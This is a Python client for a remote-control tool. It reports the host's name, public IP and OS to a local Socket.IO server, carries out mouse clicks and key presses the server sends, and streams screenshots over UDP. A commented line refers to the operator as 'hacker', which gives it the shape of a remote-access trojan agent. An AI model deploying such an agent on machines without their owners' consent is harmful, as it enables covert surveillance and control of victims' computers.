from copyreg import pickle
import socketio
from requests import get
import socket
import platform
import pyautogui
import numpy as np
import cv2
import pickle
from time import sleep
import ctypes

sio = socketio.Client()

isRemotting = False

user32 = ctypes.windll.user32

screenWidth = user32.GetSystemMetrics(0)
screenHeight = user32.GetSystemMetrics(1)

streamWidth = 1000
streamHeight = 500

@sio.event
def connect():
  print("I'm connected!")

@sio.on('info')
def myInfo():
  ip = get("https://api.ipify.org").text

  sio.emit('my info', {
    'name': socket.gethostname(),
    'ip': ip,
    'os': "mac" if platform.system() == "Darwin" else platform.system()
  })
  sio.emit('screen info', {
    'width': screenWidth,
    'height': screenHeight,
    'streamWidth': streamWidth,
    'streamHeight': streamHeight
  })

@sio.on('screen info')
def screenInfo():
  sio.emit('screen info', {'width': screenWidth, 'height': screenHeight})

@sio.on('L click')
def LClick(data):
  pyautogui.click(data['x'], data['y'])
@sio.on('R click')
def RClick(data):
  pyautogui.rightClick(data['x'], data['y'])

@sio.on('key')
def keyBoard(data):
  pyautogui.press(data['key'])


@sio.on('stop remote')
def remoteStop():
  global isRemotting
  isRemotting = False
  print("stream STOP")

@sio.on('remote start')
def remoteStart():
  sleep(1)
  global isRemotting
  isRemotting = True

  s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.setsockopt(socket.SOL_SOCKET,socket.SO_SNDBUF,1000000)
  server_ip = "localhost"
  server_port = 8001

  while isRemotting:
    frame = pyautogui.screenshot()
    frame = frame.resize((streamWidth, streamHeight))
    frame = np.array(frame)
    frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
    # cv2.imshow('result', frame)
    ret,buffer = cv2.imencode(".jpg",frame,[int(cv2.IMWRITE_JPEG_QUALITY),30])
    x_as_bytes = pickle.dumps(buffer)
    s.sendto((x_as_bytes),(server_ip,server_port))
    if cv2.waitKey(10)==13:
      break
  cv2.destroyAllWindows()
  # while isRemotting:
  #   screen = pyautogui.screenshot()
  #   src = np.array(screen)

  #   sio.emit('stream monitor', {'src': src.tolist(), 'hacker': data['hacker']})

if __name__ == '__main__':
  sio.connect('http://localhost:8000')